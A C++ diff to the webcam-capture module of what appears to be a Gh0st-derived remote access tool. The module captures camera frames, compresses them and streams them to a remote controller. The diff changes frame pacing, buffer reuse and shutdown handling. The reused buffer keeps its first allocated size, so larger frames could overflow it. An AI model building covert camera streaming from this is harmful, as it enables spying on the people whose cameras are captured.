@@ -20,6 +20,7 @@ CVideoManager::CVideoManager(IOCPClient* ClientObject, int n) : CManager(ClientO
 	m_fccHandler = 1129730893;
 
 	m_CapVideo.Open(0,0);  // 开启
+	lpBuffer = NULL;
 
 	m_hWorkThread = CreateThread(NULL, 0, 
 		(LPTHREAD_START_ROUTINE)WorkThread, this, 0, NULL);
@@ -39,17 +40,29 @@ DWORD CVideoManager::WorkThread(LPVOID lParam)
 	This->SendBitMapInfor();         //发送bmp位图结构
 	// 等控制端对话框打开
 
-	This->WaitForDialogOpen();  
+	This->WaitForDialogOpen();
+#if USING_ZLIB
+	const int fps = 8;// 帧率
+#elif USING_LZ4
+	const int fps = 8;// 帧率
+#else
+	const int fps = 8;// 帧率
+#endif
+	const int sleep = 1000 / fps;// 间隔时间（ms）
 
+	timeBeginPeriod(1);
 	while (This->m_bIsWorking)
 	{
 		// 限制速度
-		if ((GetTickCount() - dwLastScreen) < 150)
-			Sleep(100);
-
+		int span = sleep-(GetTickCount() - dwLastScreen);
+		Sleep(span > 0 ? span : 1);
+		if (span < 0)
+			printf("SendScreen Span = %d ms\n", span);
 		dwLastScreen = GetTickCount();
-		This->SendNextScreen(); //这里没有压缩相关的代码了，我们到sendNextScreen  看看
+		if(FALSE == This->SendNextScreen())
+			break;
 	}
+	timeEndPeriod(1);
 
 	This->Destroy();
 	std::cout<<"CVideoManager WorkThread end\n";
@@ -60,7 +73,7 @@ DWORD CVideoManager::WorkThread(LPVOID lParam)
 CVideoManager::~CVideoManager()
 {
 	InterlockedExchange((LPLONG)&m_bIsWorking, FALSE);
-
+	m_CapVideo.m_bExit = TRUE;
 	WaitForSingleObject(m_hWorkThread, INFINITE);
 	CloseHandle(m_hWorkThread);
 	std::cout<<"CVideoManager ~CVideoManager \n";
@@ -69,10 +82,13 @@ CVideoManager::~CVideoManager()
 		delete m_pVideoCodec;
 		m_pVideoCodec = NULL;
 	}
+	if (lpBuffer)
+		delete [] lpBuffer;
 }
 
 void CVideoManager::Destroy()
 {
+	m_bIsWorking = FALSE;
 	std::cout<<"CVideoManager Destroy \n";
 	if (m_pVideoCodec)   //压缩类
 	{
@@ -90,18 +106,21 @@ void CVideoManager::SendBitMapInfor()
 	m_ClientObject->OnServerSending((char*)szBuffer, dwBytesLength);
 }
 
-void CVideoManager::SendNextScreen()
+BOOL CVideoManager::SendNextScreen()
 {
 	DWORD dwBmpImageSize=0;
 	LPVOID	lpDIB =m_CapVideo.GetDIB(dwBmpImageSize);
+	if(lpDIB == NULL)
+		return FALSE;
+
 	// token + IsCompress + m_fccHandler + DIB
-	int		nHeadLen = 1 + 1 + 4;
+	const int nHeadLen = 1 + 1 + 4;
 
 	UINT	nBufferLen = nHeadLen + dwBmpImageSize;
-	LPBYTE	lpBuffer = new BYTE[nBufferLen];
+	lpBuffer = lpBuffer ? lpBuffer : new BYTE[nBufferLen];
 
 	lpBuffer[0] = TOKEN_WEBCAM_DIB;
-	lpBuffer[1] = m_bIsCompress;   //压缩  
+	lpBuffer[1] = m_bIsCompress;   //压缩
 
 	memcpy(lpBuffer + 2, &m_fccHandler, sizeof(DWORD));     //这里将视频压缩码写入要发送的缓冲区
 
@@ -109,15 +128,14 @@ void CVideoManager::SendNextScreen()
 	if (m_bIsCompress && m_pVideoCodec) //这里判断，是否压缩，压缩码是否初始化成功，如果成功就压缩          
 	{
 		int	nCompressLen = 0;
-		//这里压缩视频数据了 
+		//这里压缩视频数据了
 		bool bRet = m_pVideoCodec->EncodeVideoData((LPBYTE)lpDIB, 
 			m_CapVideo.GetBmpInfor()->bmiHeader.biSizeImage, lpBuffer + nHeadLen, 
 			&nCompressLen, NULL);
 		if (!nCompressLen)
 		{
 			// some thing error
-			delete [] lpBuffer;
-			return;
+			return FALSE;
 		}
 		//重新计算发送数据包的大小  剩下就是发送了，我们到主控端看一下视频如果压缩了怎么处理
 		//到主控端的void CVideoDlg::OnReceiveComplete(void)
@@ -133,7 +151,7 @@ void CVideoManager::SendNextScreen()
 
 	m_ClientObject->OnServerSending((char*)lpBuffer, nPacketLen);
 
-	delete [] lpBuffer;
+	return TRUE;
 }
 
 
